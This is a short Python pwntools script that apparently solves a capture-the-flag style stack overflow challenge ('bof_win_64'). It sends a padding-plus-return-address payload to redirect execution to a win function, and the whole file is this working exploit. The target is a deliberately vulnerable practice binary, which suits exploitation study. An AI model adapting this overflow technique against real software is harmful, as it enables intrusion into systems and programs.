from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/zeratool-challenges/overflow/bof_win_64")
pwn.gdb.attach(p)
payload = b""
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x86\x11@\x00\x00\x00\x00\x00\n'
p.send(payload)
p.recvuntil(b'pwn_me:\nYour buffer is at 0x7fffffffffefef0\n')
p.interactive()
